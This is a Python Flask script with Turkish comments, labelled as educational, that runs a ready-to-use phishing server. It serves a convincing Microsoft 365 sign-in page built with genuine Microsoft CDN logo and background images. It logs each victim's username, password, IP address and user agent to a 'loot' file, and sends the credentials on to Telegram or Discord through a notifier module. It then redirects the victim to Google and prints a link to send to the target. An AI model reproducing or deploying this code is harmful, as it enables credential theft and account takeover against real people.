#!/usr/bin/env python3
"""
Phishing Server (Eğitim Amaçlı)
===============================
Sahte bir login sayfası başlatır ve girilen şifreleri kaydeder.
Gereksinim: pip install flask
"""
import sys
import os
import logging
from datetime import datetime
try:
    from flask import Flask, request, render_template_string, redirect
except ImportError:
    print("[-] 'flask' kütüphanesi eksik. Kurulum: pip install flask")
    sys.exit(1)

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR) # Sadece hataları göster

# Gerçekçi Microsoft 365 Login Sayfası (Profesyonel Phishing Şablonu)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <style>
        body { margin: 0; font-family: 'Segoe UI', 'Helvetica Neue', 'Lucida Grande', 'Roboto', 'Ebrima', 'Nirmala UI', 'Gadugi', 'Segoe Xbox Symbol', 'Segoe UI Symbol', 'Meiryo UI', 'Khmer UI', 'Tunga', 'Lao UI', 'Raavi', 'Iskoola Pota', 'Latha', 'Leelawadee', 'Microsoft YaHei UI', 'Microsoft JhengHei UI', 'Malgun Gothic', 'Estrangelo Edessa', 'Microsoft Himalaya', 'Microsoft New Tai Lue', 'Microsoft PhagsPa', 'Microsoft Tai Le', 'Microsoft Yi Baiti', 'Mongolian Baiti', 'MV Boli', 'Myanmar Text', 'Cambria Math'; background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg'); background-size: cover; background-position: center; height: 100vh; display: flex; align-items: center; justify-content: center; }
        .login-box { width: 440px; min-height: 338px; background-color: #fff; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); box-sizing: border-box; }
        .logo { max-height: 24px; margin-bottom: 24px; }
        .title { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 16px; margin-top: 0; }
        .input-box { width: 100%; border: none; border-bottom: 1px solid #666; padding: 6px 0; font-size: 15px; margin-bottom: 24px; outline: none; }
        .input-box:focus { border-bottom: 1px solid #0067b8; }
        .input-box::placeholder { color: #666; }
        .btn-primary { background-color: #0067b8; color: #fff; border: none; padding: 10px 32px; font-size: 15px; cursor: pointer; float: right; }
        .btn-primary:hover { background-color: #005da6; }
        .links { margin-top: 16px; font-size: 13px; color: #0067b8; }
        .links a { color: #0067b8; text-decoration: none; cursor: pointer; }
        .links a:hover { text-decoration: underline; }
        .footer { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.6); padding: 8px 24px; color: #fff; font-size: 12px; display: flex; justify-content: flex-end; gap: 20px; box-sizing: border-box; }
        .error { color: #e81123; font-size: 15px; margin-bottom: 16px; display: {% if error %}block{% else %}none{% endif %}; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft" class="logo">
        <h1 class="title">Sign in</h1>
        <div class="error">We couldn't find an account with that username. Try another, or get a new Microsoft account.</div>
        <form method="POST" action="/">
            <input type="text" name="username" class="input-box" placeholder="Email, phone, or Skype" required>
            <input type="password" name="password" class="input-box" placeholder="Password" style="margin-top: -10px;" required>
            <div class="links">
                <p>No account? <a href="#">Create one!</a></p>
                <p><a href="#">Can't access your account?</a></p>
            </div>
            <div style="margin-top: 32px; overflow: hidden;">
                <button type="submit" class="btn-primary">Next</button>
            </div>
        </form>
    </div>
    <div class="footer">
        <span>Terms of use</span>
        <span>Privacy & cookies</span>
        <span>...</span>
    </div>
</body>
</html>
"""

loot_file = "phishing_loot.txt"
redirect_url = "https://www.google.com"
page_title = "Kurumsal Portal"

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        ip_addr = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        
        msg = f"[\033[91m!\033[0m] \033[92mYENİ KURBAN YAKALANDI!\033[0m\n  -> IP   : {ip_addr}\n  -> User : {username}\n  -> Pass : {password}"
        print(f"\n{msg}")
        
        with open(loot_file, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now()}] IP: {ip_addr} | User: {username} | Pass: {password} | UA: {user_agent}\n")
            
        # TELEGRAM / DISCORD BİLDİRİMİ GÖNDER
        try:
            sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
            import Notifier
            Notifier.send_alert(f"Target IP: {ip_addr}\nUsername: {username}\nPassword: {password}", title="🎣 PHISHING CREDENTIALS CAPTURED!")
        except Exception as e:
            pass
            
        return redirect(redirect_url)
        
    return render_template_string(HTML_TEMPLATE, title=page_title, error=request.args.get('error'))

if __name__ == "__main__":
    print("\n\033[93m[*] Phishing Server Başlatılıyor...\033[0m")
    
    if len(sys.argv) > 1:
        port = int(sys.argv[1])
    else:
        port = 8080
        
    if len(sys.argv) > 2:
        redirect_url = sys.argv[2]
        
    if len(sys.argv) > 3:
        page_title = sys.argv[3]

    print(f"\033[96m[+] Dinlenen Port  :\033[0m {port}")
    print(f"\033[96m[+] Yönlendirme    :\033[0m {redirect_url}")
    print(f"\033[96m[+] Sayfa Başlığı  :\033[0m {page_title}")
    print(f"\033[92m[*] Hedefe Gönderilecek Link: http://<Senin-IP-Adresin>:{port}/\033[0m\n")
    
    app.run(host="0.0.0.0", port=port)
